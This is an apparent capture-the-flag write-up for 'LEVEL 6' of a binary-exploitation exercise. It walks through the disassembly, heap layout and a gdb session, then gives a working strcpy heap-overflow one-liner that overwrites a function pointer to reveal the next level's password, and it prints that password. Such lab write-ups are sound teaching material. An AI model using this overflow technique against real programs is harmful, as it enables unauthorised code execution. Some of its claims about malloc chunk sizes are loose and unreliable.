## LEVEL 6
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---

Most important parts to understand :
```assembly
n:
    0x08048461 <+13>:	call   0x8048370 <system@plt> ; Call system with "/bin/cat /home/user/level7/.pass" as argument
```
    
```assembly
m:
    0x08048475 <+13>:	call   0x8048360 <puts@plt> ; Call puts with "Nope" as asgument.
```
```assembly
main:
    0x0804848c <+16>:	call   0x8048350 <malloc@plt> ; Allocate 64 in heap 
    0x0804849c <+32>:	call   0x8048350 <malloc@plt> ; Allocate 4 bytes in heap;
    0x080484a5 <+41>:	mov    $0x8048468,%edx ; Set m function address in $edx
    0x080484ae <+50>:	mov    %edx,(%eax) ; The second allocated address point to m
    0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> ; Call strcpy with buffer as first arg and argv[1] as second
    0x080484d0 <+84>:	call   *%eax ; Call the function of $eax
```

This level introduces something we didn't see in previous levels: malloc and strcpy. In this level, there are two calls to malloc. The first one is used to store a copy of argv[1], and the second one is used to store a pointer to a function. By default, this pointer is set to the m function. I will utilize this pointer to call n instead of m. However, before doing that, we need to understand a particularity of malloc allocation and storage compared to the stack.

The first particularity is the way allocations are made in the heap. When you create and call a function, the stack moves downward in memory to allocate the necessary space. For example, if `$esp` is at 0x100 and I call a function that allocates `0x20` bytes, then `$esp` will be at `0xe0`. However, in the heap, the allocations are made in the opposite manner. If I allocate `0x20` bytes in the heap, the allocation will be from `0x0` to `0x20`, and the subsequent one will be from `0x20` to `0x40`. This detail is not particularly relevant for this project, but it is useful to know for a better understanding of how program memory operates.

The second particularity is how `malloc` allocates memory. If I call `malloc(60)` my program won't allocate 60, it will allocates much bigger memory depending of many things like your CPU, OS, RAM, etc. This is because `malloc` allocates memory in chunks. For example, if I call `malloc(60)` on my computer, it will allocate 72 bytes. If I call `malloc(1000)` it will allocate 4096 bytes. This is because `malloc` allocates memory in chunks. If I call `malloc(8)` it will allocate 16 bytes, and if I call `malloc(16)` it will allocate 24 bytes. This is important to know because if I call `malloc(60)` and then `malloc(4)`, the second allocation will be in the same chunk as the first one. This means that if I write more than 60 bytes in the first allocation, I will overwrite the second allocation. This is what I will use to call the n function instead of the m function. All the numbers in this paragraph are examples, and they may vary depending on your computer.

Now that we understand how the heap works, we can use the second allocation to overwrite the pointer to the m function with the pointer to the n function. To do this, we need to understand where exactly is the address to overwrite, and what is the length between the first allocation and the second one.
```shell
(gdb) b *0x080484ca
Breakpoint 1 at 0x80484ca
(gdb) r AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level6/level6 AAAA

Breakpoint 1, 0x080484ca in main ()
(gdb) x/32 0x0804a008
0x804a008:	0x41414141	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
```

Perfect, so the first address is `0x804a008` and the second one is `0x804a050`. The length between the two is `0x48` or `72` in decimal. Now we can write our exploit. We will write 72 bytes of garbage, and then the address of the n function. The address of the n function is `0x08048454`. Perfect now we have everything we need, we can write our exploit.

```shell
$ ./level6 `python -c 'print "\x90"*72 + "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
